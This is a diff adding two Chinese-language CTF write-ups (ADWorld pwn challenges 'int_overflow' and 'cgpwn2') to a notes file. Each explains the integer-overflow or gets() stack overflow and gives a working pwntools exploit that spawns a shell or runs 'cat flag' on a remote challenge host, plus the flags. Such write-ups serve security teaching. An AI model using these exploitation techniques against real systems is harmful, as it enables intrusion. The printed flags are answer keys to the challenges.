@@ -649,6 +649,93 @@ io.interactive()
 
 ------
 
+### [int_overflow](https://adworld.xctf.org.cn/task/answer?type=pwn&number=2&grade=0&id=5058)
+
+先`file ./int_overflow`查看文件类型再`checksec --file=int_overflow`检查了一下文件保护情况。
+
+![](https://paper.tanyaodan.com/ADWorld/pwn/5058/1.png)
+
+用`IDA Pro 32bit`打开附件`int_overflow`，按`F5`反汇编源码并查看主函数，显然首先要发送`1`来进入`login()`函数。
+
+![](https://paper.tanyaodan.com/ADWorld/pwn/5058/2.png)
+
+双击`login()`函数查看详情，不存在栈溢出，程序接受了一个最大长度为`0x199`的`password`，并将其作为参数传递给了`check_passwd()`函数。
+
+![](https://paper.tanyaodan.com/ADWorld/pwn/5058/3.png)
+
+双击`check_passwd()`函数查看详情，程序用了一个`8bit`的无符号整型变量存储`password`的长度，之后用字符串拷贝函数`strcpy()`将其拷贝到一个长度为`0x14`的`char`型变量`dest`中。`8bit`能表示的十进制范围是`0~255`，而`password`的最大长度为`0x199`（十进制为 409），长度远大于`1`字节，存在整数溢出。`password`字符串的长度可以是`4~8`个字符，也可以是`259~263`个字符，因此我们可以利用整数溢出来绕过`if`判断从而构造栈溢出。
+
+![](https://paper.tanyaodan.com/ADWorld/pwn/5058/4.png)
+
+在`Function Window`中注意到有一个名为`what_is_this()`的函数，函数返回值直接是系统调用`system("cat flag")`，因此构造`payload`时需要再加上这个`what_is_this()`函数的起始地址`0x804868B`，当然也可以`ELF`再`symbols['what_is_this']`来获取。
+
+![](https://paper.tanyaodan.com/ADWorld/pwn/5058/5.png)
+
+编写`Python`代码即可得到`cyberpeace{8f9f902ebeb37850f02feee9facc249d}`。
+
+```python
+from pwn import *
+
+io = remote('111.200.241.244', 55529)
+e = ELF('./int_overflow')
+io.sendlineafter(b'Your choice:', b'1')
+io.sendlineafter(b'Please input your username:', b't0ur1st')
+payload = b'a'*0x14 + b'pwn!' + p32(e.symbols['what_is_this'])
+payload = payload.ljust(263, b'a')
+io.sendlineafter(b'Please input your passwd:', payload)
+io.interactive()
+```
+
+![](https://paper.tanyaodan.com/ADWorld/pwn/5058/6.png)
+
+------
+
+### [cgpwn2](https://adworld.xctf.org.cn/task/answer?type=pwn&number=2&grade=0&id=5059)
+
+先`file ./cgpwn2`查看文件类型再`checksec --file=cgpwn2`检查了一下文件保护情况。
+
+![](https://paper.tanyaodan.com/ADWorld/pwn/5059/1.png)
+
+用`IDA Pro 32bit`打开附件`int_overflow`，按`F5`反汇编源码并查看主函数，发现`hello()`函数很可疑。
+
+![](https://paper.tanyaodan.com/ADWorld/pwn/5059/2.png)
+
+双击`hello()`函数查看详情，可以看到该函数中有个局部变量`s`是`char`型数组，`s`的长度只有`0x26`，但是`gets()`函数并没有限制输入，显然存在栈溢出漏洞。
+
+![](https://paper.tanyaodan.com/ADWorld/pwn/5059/3.png)
+
+注意到`name`是`bss`段中一个大小为`0x34`的区域，变量`s`的起始位置在程序运行时距离栈帧有`0x26`个字节。
+
+![](https://paper.tanyaodan.com/ADWorld/pwn/5059/4.png)
+
+![](https://paper.tanyaodan.com/ADWorld/pwn/5059/5.png)
+
+构造`payload`时可以先传入`/bin/sh`给`name`，接着用`0x26`个字节占满`s`变量，然后再用`4`个字节覆盖到`r`，最后指向`system()`函数和`name`的地址，从而完成系统调用。编写`Python`代码即可得到`cyberpeace{0de31e1800e130387c77fabf5ece76c9}`。
+
+```python
+from pwn import *
+
+io = remote('111.200.241.244', 56171)
+e = ELF('./cgpwn2')
+system_address = e.symbols['system']
+info('system_address => 0x%x', system_address)
+name_address = 0x804A080 
+payload = b'a'*0x26 + b'fuck' + p32(system_address) + p32(0xdeadbeef) + p32(name_address)
+io.sendlineafter(b'please tell me your name', b'/bin/sh')
+io.sendlineafter(b'hello,you can leave some message here:', payload)
+io.interactive()
+```
+
+![](https://paper.tanyaodan.com/ADWorld/pwn/5059/6.png)
+
+------
+
+
+
+
+
+------
+
 ## CTFShow
 
 ### pwn02
